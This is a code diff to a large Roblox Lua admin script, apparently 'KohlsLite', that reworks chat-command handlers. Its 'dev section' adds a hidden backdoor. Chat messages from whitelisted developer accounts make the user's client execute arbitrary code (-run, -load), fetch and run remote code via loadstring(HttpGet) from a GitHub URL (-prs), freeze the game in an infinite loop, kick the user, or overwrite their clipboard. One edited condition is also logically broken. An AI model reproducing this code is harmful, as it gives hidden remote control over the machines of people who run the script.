@@ -6306,8 +6306,7 @@ Commands required: rocket]])
     end
 
     if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'blyat' then
-                thesecretvariable = false
-		Remind("how did you find this command")
+		Remind("nuh uh")
     end
 
 -- From here, my script becomes infinite yield because of Proton... --
@@ -8311,318 +8310,402 @@ end)
 
 -- some antis and admin system
 function PLRSTART(v)
-v.Chatted:Connect(function(msg)
-     task.wait(0)
-     task.spawn(function()
-                task.wait(0)
+    v.Chatted:Connect(function(msg)
+            task.wait(0)
+            task.spawn(function()
+                    task.wait(0)
 
-                if string.sub(msg:lower(), 0, 9) == "/c system" and v.Name ~= game.Players.LocalPlayer.Name then
-                   if PingCsystem then
-                        print(v.Name..' is using /c system.')
-                        Chat("h \n\n\n "..v.Name.." is using /c system. \n\n\n")
-                   end
-                end
+                    if string.sub(msg:lower(), 0, 9) == "/c system" and v.Name ~= game.Players.LocalPlayer.Name then
+                        if PingCsystem then
+                            print(v.Name .. " is using /c system.")
+                            Chat("h \n\n\n " .. v.Name .. " is using /c system. Sneaky! \n\n\n")
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 2) == "/w" and v.Name ~= game.Players.LocalPlayer.Name then
-                   if PingCsystem then
-                        print(v.Name..' is using whispering commands.')
-                        Chat("h \n\n\n "..v.Name.." is using whispering commands. \n\n\n")
-                   end
-                end
+                    if string.sub(msg:lower(), 0, 2) == "/w" and v.Name ~= game.Players.LocalPlayer.Name then
+                        if PingCsystem then
+                            print(v.Name .. " is using whispering commands.")
+                            Chat("h \n\n\n " .. v.Name .. " is using whispering commands. \n\n\n")
+                        end
+                    end
 
-                if (string.sub(msg:lower(), 0, 4) == "logs" or string.sub(msg:lower(), 0, 5) == ":logs") and v.Name ~= game.Players.LocalPlayer.Name then
-                   if PingLogs then
-                        print(v.Name..' is using logs.')
-                        Chat("h \n\n\n "..v.Name.." is using logs. \n\n\n")
-                   end
-                           if AntiLogs then
-                                    LogSpam()
-                           end
-                end
+                    if (string.sub(msg:lower(), 0, 4) == "logs" or string.sub(msg:lower(), 0, 5) == ":logs") and v.Name ~= game.Players.LocalPlayer.Name
+                     then
+                        if PingLogs then
+                            print(v.Name .. " is using logs.")
+                            Chat("h \n\n\n " .. v.Name .. " is using logs. \n\n\n")
+                        end
+                        if AntiLogs then
+                            LogSpam()
+                        end
+                    end
 
-                if (string.sub(msg:lower(), 0, 6) == "btools" or string.sub(msg:lower(), 0, 7) == ":btools" or string.sub(msg:lower(), 0, 7) == ";btools") and v.Name ~= game.Players.LocalPlayer.Name then
-                        print(v.Name..' thought btools existed.')
-                        Chat("h \n\n\n "..v.Name..", btools do not exist anymore! \n\n\n")
-                end
+                    if (string.sub(msg:lower(), 0, 6) == "btools" or string.sub(msg:lower(), 0, 7) == ":btools" or string.sub(msg:lower(), 0, 7) == ";btools") and v.Name ~= game.Players.LocalPlayer.Name then
+                        print(v.Name .. " thought btools existed.")
+                        Chat("h \n\n\n " .. v.Name .. ", btools do not exist anymore! \n\n\n")
+                    end
 
-		if (string.sub(msg:lower(), 0, 3) == "f3x" or string.sub(msg:lower(), 0, 4) == ":f3x" or string.sub(msg:lower(), 0, 4) == ";f3x") and v.Name ~= game.Players.LocalPlayer.Name then
-                        print(v.Name..' thought f3x existed.')
-                        Chat("h \n\n\n "..v.Name..", f3x do not exist! \n\n\n")
-                end
-		
-                if (string.sub(msg:lower(), 0, 3) == "sit" or string.sub(msg:lower(), 0, 4) == ":sit") and v.Name ~= game.Players.LocalPlayer.Name then
-                   if antiattach then
-                     Chat("reload "..v.Name)
-                     print(v.Name..' tried to sit.')
-                   end
-                end
+                    if (string.sub(msg:lower(), 0, 3) == "f3x" or string.sub(msg:lower(), 0, 4) == ":f3x" or string.sub(msg:lower(), 0, 4) == ";f3x") and v.Name ~= game.Players.LocalPlayer.Name then
+                        print(v.Name .. " thought f3x existed.")
+                        Chat("h \n\n\n " .. v.Name .. ", f3x do not exist! \n\n\n")
+                    end
 
-                if (string.sub(msg:lower(), 0, 8) == "unpunish" or string.sub(msg:lower(), 0, 9) == ":unpunish") and v.Name ~= game.Players.LocalPlayer.Name then
-                   if antiattach then
-                     Chat("reload "..v.Name)
-                     print(v.Name..' tried to unpunish.')
-                   end
-                end
+                    if (string.sub(msg:lower(), 0, 3) == "sit" or string.sub(msg:lower(), 0, 4) == ":sit") and v.Name ~= game.Players.LocalPlayer.Name then
+                        if antiattach then
+                            Chat("reload " .. v.Name)
+                            print(v.Name .. " tried to sit.")
+                        end
+                    end
 
-                if (string.sub(msg:lower(), 0, 4) == "stun" or string.sub(msg:lower(), 0, 5) == ":stun") and v.Name ~= game.Players.LocalPlayer.Name then
-                   if antiattach then
-                     Chat("reload "..v.Name)
-                     print(v.Name..' tried to stun.')
-                   end
-                end
+                    if (string.sub(msg:lower(), 0, 8) == "unpunish" or string.sub(msg:lower(), 0, 9) == ":unpunish") and v.Name ~= game.Players.LocalPlayer.Name then
+                        if antiattach then
+                            Chat("reload " .. v.Name)
+                            print(v.Name .. " tried to unpunish.")
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 4) == ".fly" and v.Name ~= game.Players.LocalPlayer.Name then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", it is fly me, not .fly!! \n\n\n")
-                end
-                end
+                    if (string.sub(msg:lower(), 0, 4) == "stun" or string.sub(msg:lower(), 0, 5) == ":stun") and v.Name ~= game.Players.LocalPlayer.Name then
+                        if antiattach then
+                            Chat("reload " .. v.Name)
+                            print(v.Name .. " tried to stun.")
+                        end
+                    end
+
+                    if string.sub(msg:lower(), 0, 4) == ".fly" and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said '.fly' ")
+                            Chat("h \n\n\n " .. v.Name .. ", it is fly me, not .fly!! \n\n\n")
+                        end
+                    end
 
                     if string.sub(msg:lower(), 0, 4) == ";fly" and v.Name ~= game.Players.LocalPlayer.Name then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", it is fly me, not ;fly!! \n\n\n")
-                end
-                end
-
-                if string.sub(msg:lower(), 0, 4) == "/fly" and v.Name ~= game.Players.LocalPlayer.Name then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", it is fly me, not /fly!! \n\n\n")
-                end
-                end
-
-                if string.sub(msg:lower(), 0, 5) == ";poop" or string.sub(msg:lower(), 0, 5) == ":poop" or string.sub(msg:lower(), 0, 4) == "poop" or string.sub(msg:lower(), 0, 5) == ".poop" then
-                if noobdetect then
-                   if v.Name ~= "IceStuds" and v.Name ~= "atprog" then -- very epik exception
-                           print(v.Name..' is a noob.')
-                           Chat("h \n\n\n "..v.Name..", go back to FREE ADMIN, POOP IS NOT A COMMAND!! \n\n\n")
-                     elseif v.Name == "IceStuds" then Chat("h \n\n\n [IceStuds]: Poop \n\n\n")
-                   else Chat("h \n\n\n [atprog]: Poop \n\n\n")
-                   end
-                end
-                end
-
-                if string.sub(msg:lower(), 0, 6) == ";morph" or string.sub(msg:lower(), 0, 6) == ":morph" or string.sub(msg:lower(), 0, 5) == "morph" then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", go back to FREE ADMIN, MORPH IS NOT A COMMAND!! \n\n\n")
-                end
-                end
-
-                if string.sub(msg:lower(), 0, 5) == ";cmds" or string.sub(msg:lower(), 0, 9) == ";commands" then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", imagine using the ; prefix! You do not need any!! \n\n\n")
-                end
-                end
-
-                if string.sub(msg:lower(), 0, 5) == "/cmds" or string.sub(msg:lower(), 0, 9) == "/commands" then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", imagine using the / prefix! You do not need any!! \n\n\n")
-                end
-                end
-
-                if (string.sub(msg:lower(), 0, 5) == ".cmds" or string.sub(msg:lower(), 0, 9) == ".commands") and v.Name ~= game.Players.LocalPlayer.Name then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", imagine using the . prefix! You do not need any!! \n\n\n")
-                end
-                end
-
-                if string.sub(msg:lower(), 0, 7) == ";fly me" then
-                if noobdetect then
-                   print(v.Name..' is a noob.') 
-                   Chat("h \n\n\n "..v.Name..", imagine using the ; prefix! You do not need any!! \n\n\n")
-                end
-                end
-
-                if (string.sub(msg:lower(), 0, 6) == ";bring" or string.sub(msg:lower(), 0, 6) == ":bring" or string.sub(msg:lower(), 0, 5) == "bring" or string.sub(msg:lower(), 0, 6) == ".bring") and v.Name ~= game.Players.LocalPlayer.Name then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", it is tp (plr) me, not ;bring!! \n\n\n")
-                end
-                end
-
-                if (string.sub(msg:lower(), 0, 5) == ";goto" or string.sub(msg:lower(), 0, 5) == ":goto" or string.sub(msg:lower(), 0, 4) == "goto" or string.sub(msg:lower(), 0, 5) == ".goto") and v.Name ~= game.Players.LocalPlayer.Name then
-                if noobdetect then
-                   print(v.Name..' is a noob.') 
-                   Chat("h \n\n\n "..v.Name..", it is tp me (plr), not ;goto!! \n\n\n")
+			if not string.sub(msg:lower(), 0, 7) == ";fly me" then
+                        	if noobdetect then
+                            		print(v.Name .. " is a noob. / Said ';fly' ")
+                            		Chat("h \n\n\n " .. v.Name .. ", it is fly me, not ;fly!! \n\n\n")
+                        	end
+			end
                     end
-                end
+
+                    if string.sub(msg:lower(), 0, 4) == "/fly" and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said '/fly' ")
+                            Chat("h \n\n\n " .. v.Name .. ", it is fly me, not /fly!! \n\n\n")
+                        end
+                    end
+
+                    if string.sub(msg:lower(), 0, 5) == ";poop" or string.sub(msg:lower(), 0, 5) == ":poop" or string.sub(msg:lower(), 0, 4) == "poop" or string.sub(msg:lower(), 0, 5) == ".poop" then
+                        if noobdetect then
+                            if v.Name ~= "IceStuds" and v.Name ~= "atprog" then -- very epik exception
+                                print(v.Name .. " is a noob. / Said 'poop' ")
+                                Chat("h \n\n\n " .. v.Name .. ", did you come from a FREE ADMIN game? POOP isn't a command! \n\n\n")
+                            elseif v.Name == "IceStuds" then
+                                Chat("h \n\n\n [IceStuds]: Poop \n\n\n")
+                            else
+                                Chat("h \n\n\n [atprog]: Poop \n\n\n")
+                            end
+                        end
+                    end
+
+                    if string.sub(msg:lower(), 0, 6) == ";morph" or string.sub(msg:lower(), 0, 6) == ":morph" or string.sub(msg:lower(), 0, 5) == "morph" then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said 'morph' ")
+                            Chat("h \n\n\n " .. v.Name .. ", did you come from a FREE ADMIN game? MORPH isn't a command! \n\n\n")
+                        end
+                    end
+
+                    if string.sub(msg:lower(), 0, 5) == ";cmds" or string.sub(msg:lower(), 0, 9) == ";commands" and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said ';cmds' ")
+                            Chat("h \n\n\n " .. v.Name .. ", imagine using the ; prefix! Just say 'commands' or 'cmds'! \n\n\n")
+                        end
+                    end
+
+                    if string.sub(msg:lower(), 0, 5) == "/cmds" or string.sub(msg:lower(), 0, 9) == "/commands" and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said '/cmds' ")
+                            Chat("h \n\n\n " .. v.Name .. ", imagine using the / prefix! Just say 'commands' or 'cmds'! \n\n\n")
+                        end
+                    end
+
+                    if (string.sub(msg:lower(), 0, 5) == ".cmds" or string.sub(msg:lower(), 0, 9) == ".commands") and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said '.cmds' ")
+                            Chat("h \n\n\n " .. v.Name .. ", imagine using the . prefix! Just say 'commands' or 'cmds'! \n\n\n")
+                        end
+                    end
+
+                    if string.sub(msg:lower(), 0, 7) == ";fly me" and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said ';fly me' ")
+                            Chat("h \n\n\n " .. v.Name .. ", imagine using the ; prefix! Just say 'fly me'! \n\n\n")
+                        end
+                    end
+
+                    if (string.sub(msg:lower(), 0, 6) == ";bring" or string.sub(msg:lower(), 0, 6) == ":bring" or string.sub(msg:lower(), 0, 5) == "bring" or string.sub(msg:lower(), 0, 6) == ".bring") and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said 'bring' ")
+                            Chat("h \n\n\n " .. v.Name .. ", it is tp (player) me, not bring (player)!! \n\n\n")
+                        end
+                    end
+
+                    if (string.sub(msg:lower(), 0, 5) == ";goto" or string.sub(msg:lower(), 0, 5) == ":goto" or string.sub(msg:lower(), 0, 4) == "goto" or string.sub(msg:lower(), 0, 5) == ".goto") and v.Name ~= game.Players.LocalPlayer.Name then
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said 'goto' ")
+                            Chat("h \n\n\n " .. v.Name .. ", it is tp me (player), not goto (player)!! \n\n\n")
+                        end
+                    end
 
                     if (string.sub(msg:lower(), 0, 6) == ";sword" or string.sub(msg:lower(), 0, 6) == ".sword") and v.Name ~= game.Players.LocalPlayer.Name then
-                if noobdetect then
-                   print(v.Name..' is a noob.')
-                   Chat("h \n\n\n "..v.Name..", it is sword me, not ;sword!! \n\n\n")
-                end
-                end
+                        if noobdetect then
+                            print(v.Name .. " is a noob. / Said ';sword'")
+                            Chat("h \n\n\n " .. v.Name .. ", it is sword me, not ;sword or .sword!! \n\n\n")
+                        end
+                    end
 
-                -- // dev \\ --
+                    -- // dev section \\ --
 
-                if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-				if thesecretvariable == true then
-                                	Speak("I use KohlsLite!")
-				end
-                end
+                    if
+                        string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(specialperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            Speak("I use KohlsLite!")
+                        end
+                    end
 
-        	if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-					Speak("Collect my pages pav...")
-                end
+                    if
+                        string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            Speak("Collect my pages...")
+                        end
+                    end
 
-            if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-            setclipboard("https://discord.gg/Q7Q7rAyckJ")
-            end
+                    if
+                        string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            setclipboard("https://discord.gg/Q7Q7rAyckJ")
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-				if thesecretvariable == true then
-                                	pcall(function()
-                                        	game.Players.LocalPlayer:Kick("A KohlsLite collaborator kicked you from the game!")
-                                	end)
+                    if
+                        string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(specialperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            pcall(
+                                function()
+                                    game.Players.LocalPlayer:Kick("A KohlsLite dev kicked you from the game!")
                                 end
-                end
+                            )
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                	pcall(function()
-                                        	game.Players.LocalPlayer:Kick("FE BYPASSED ~atprog")
-                                	end)
-                end
+                    if
+                        string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            pcall(
+                                function()
+                                    game.Players.LocalPlayer:Kick("FE BYPASSED ~atprog")
+                                end
+                            )
+                        end
+                    end
 
--- DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - DO NOT REMOVE THE COMMENTS! - 
+                    if
+                        string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(specialperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            Remind("You have been warned by a KohlsLite dev!")
+                        end
+                    end
 
-       	--[[	if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-                                pcall(function
-                                end)
-                end
+                    if
+                        string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            Remind("You have been warned by a KohlsLite collaborator!")
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 9) == "-fortnite" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                pcall(function(
-                                end)
-                end ]]
+                    if
+                        string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(specialperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            while true do
+                            end
+                        -- game:Shutdown()
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-				if thesecretvariable == true then
-					Remind("You have been warned by a KohlsLite collaborator!")
-				end
-                end
+                    if
+                        string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            while true do
+                            end
+                        -- game:Shutdown()
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-                                    	Remind("You have been warned!")
-                end
+                    if
+                        string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(specialperms, v.Name)
+                     then
+                        if thesecretvariable == true then
+                            Execute(string.sub(msg, 6))
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-				if thesecretvariable == true then
-                                     while true do end
-                                -- game:Shutdown()
-				end
-                end
+                    if
+                        string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            Execute(string.sub(msg, 6))
+                        end
+                    end
 
-                if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				       while true do end
-                                -- game:Shutdown()
-                end
-
-           	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-				if thesecretvariable == true then
-        				Execute(string.sub(msg, 6))
-				end
-    		end
-
-           	if string.sub(msg:lower(), 0, 4) == "-run" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-				        Execute(string.sub(msg, 6))
-    		end
-
-               if string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
+                    if
+                        string.sub(msg:lower(), 0, 4) == "-prs" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
                         loadstring(game:HttpGet("https://raw.githubusercontent.com/ThisSadQWE31/beamd/main/procod"))()
-            end
-
-           	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
-				if thesecretvariable == true then
-        				GExecute(string.sub(msg, 7))
-				end
-    		end
-
-           	if string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
-        				GExecute(string.sub(msg, 7))
-    		end
-
-                end)
--- ADMIN
-            if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
-                    local command = string.gsub(msg:lower(), "me", v.Name)
-                    if string.sub(command, 1, 1) == ":" then
-                               command = ""
-                               Chat("pm "..v.Name.." Please use commands without : - Thanks!")
                     end
 
-                    if string.sub(command, 1, 1) == "/" then -- because /e dance
-                               command = ""
+                    if
+                        string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(specialperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            GExecute(string.sub(msg, 7))
+                        end
                     end
+
+                    if
+                        string.sub(msg:lower(), 0, 5) == "-load" and v.Name ~= game.Players.LocalPlayer.Name and
+                            table.find(atprogperms, v.Name)
+                     then
+                        if
+                            not table.find(specialperms, game.Players.LocalPlayer.Name) and
+                                not table.find(atprogperms, game.Players.LocalPlayer.Name)
+                         then
+                            GExecute(string.sub(msg, 7))
+                        end
+                    end
+                end
+            )
+
+            -- END OF DEV SECTION --
+
+            -- ADMIN
+            if
+                (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and
+                    not table.find(newplrslocked, v.Name) and
+                    not slockenabled and
+                    v.Name ~= game.Players.LocalPlayer.Name
+             then
+                local command = string.gsub(msg:lower(), "me", v.Name)
+                if string.sub(command, 1, 1) == ":" then
+                    command = ""
+                    Chat("pm " .. v.Name .. " Please use commands without : - Thanks!")
+                end
+
+                if string.sub(command, 1, 1) == "/" then -- because /e dance
+                    command = ""
+                end
 
                 if string.sub(command, 1, 1) == prefix then -- so THEY don't use YOU!
-                       command = ""
+                    command = ""
                 end
 
-            if string.sub(command, 1, 5) == "music" then
-               local MUSIC = string.sub(command, 7)
-               Chat("music "..MUSIC)
-
-            elseif string.sub(command, 1, 2) == "m " then
-               local message = string.sub(command, 3)
-               Chat('m '..v.Name..': '..message)
-
-            elseif string.sub(command, 1, 7) == "size me" then
-               local NUMBER = string.sub(command, 9)
-               Chat("size "..v.Name.." "..NUMBER)
-
-            elseif string.sub(command, 1, 12) == "jumppower me" then
-               local JPP = string.sub(command, 14)
-               Chat("jumppower "..v.Name.." "..JPP)
-
-            elseif string.sub(command, 1, 7) == "name me" then
-               local NAME = string.sub(command, 9)
-               Chat("name "..v.Name.." "..NAME)
-
-            elseif string.sub(command, 1, 7) == "message" then
-               local message = string.sub(command, 9)
-               Chat('message '..v.Name..': '..message)
-
-            elseif string.sub(command, 1, 3) == "pm " then
-               Chat("pm "..v.Name.." I can't make you private message because of limitations. Sorry!")
-
-            elseif string.sub(command, 1, 5) == "hint " then
-               local message = string.sub(command, 6)
-               Chat('h '..v.Name..': '..message)
-
-            elseif string.sub(command, 1, 2) == "h " then
-               local message = string.sub(command, 3)
-               Chat('h '..v.Name..': '..message)
-
-            elseif string.sub(command, 1, 4) == "logs" then
-               Chat("pm "..v.Name.." I can't make you see logs because it's client sided. Sorry!")
-
-            elseif string.sub(command, 1, 4) == "cmds" then
-               Chat("pm "..v.Name.." I can't make you see commands because it's client sided. Sorry!")
-
-            elseif string.sub(command, 1, 8) == "commands" then
-               Chat("pm "..v.Name.." I can't make you see commands because it's client sided. Sorry!")
-
-            elseif string.sub(command, 1, 9) == "musiclist" then
-               Chat("pm "..v.Name.." I can't make you see the music list because it's client sided. Sorry!")
-
-            elseif string.sub(command, 1, 11) == "packagelist" then
-               Chat("pm "..v.Name.." I can't make you see the package list because it's client sided. Sorry!")
-
-            else
-               Chat(command)
+                if string.sub(command, 1, 5) == "music" then
+                    local MUSIC = string.sub(command, 7)
+                    Chat("music " .. MUSIC)
+                elseif string.sub(command, 1, 2) == "m " then
+                    local message = string.sub(command, 3)
+                    Chat("m " .. v.Name .. ": " .. message)
+                elseif string.sub(command, 1, 7) == "size me" then
+                    local NUMBER = string.sub(command, 9)
+                    Chat("size " .. v.Name .. " " .. NUMBER)
+                elseif string.sub(command, 1, 12) == "jumppower me" then
+                    local JPP = string.sub(command, 14)
+                    Chat("jumppower " .. v.Name .. " " .. JPP)
+                elseif string.sub(command, 1, 7) == "name me" then
+                    local NAME = string.sub(command, 9)
+                    Chat("name " .. v.Name .. " " .. NAME)
+                elseif string.sub(command, 1, 7) == "message" then
+                    local message = string.sub(command, 9)
+                    Chat("message " .. v.Name .. ": " .. message)
+                elseif string.sub(command, 1, 3) == "pm " then
+                    Chat("pm " .. v.Name .. " I can't make you private message because of limitations. Sorry!")
+                elseif string.sub(command, 1, 5) == "hint " then
+                    local message = string.sub(command, 6)
+                    Chat("h " .. v.Name .. ": " .. message)
+                elseif string.sub(command, 1, 2) == "h " then
+                    local message = string.sub(command, 3)
+                    Chat("h " .. v.Name .. ": " .. message)
+                elseif string.sub(command, 1, 4) == "logs" then
+                    Chat("pm " .. v.Name .. " I can't make you see logs because it's client sided. Sorry!")
+                elseif string.sub(command, 1, 4) == "cmds" then
+                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client sided. Sorry!")
+                elseif string.sub(command, 1, 8) == "commands" then
+                    Chat("pm " .. v.Name .. " I can't make you see commands because it's client sided. Sorry!")
+                elseif string.sub(command, 1, 9) == "musiclist" then
+                    Chat("pm " .. v.Name .. " I can't make you see the music list because it's client sided. Sorry!")
+                elseif string.sub(command, 1, 11) == "packagelist" then
+                    Chat("pm " .. v.Name .. " I can't make you see the package list because it's client sided. Sorry!")
+                else
+                    Chat(command)
+                end
             end
-          end
-
-
-    end)
-
+        end
+    )
 end
+
 
 
 -- Anti lag items
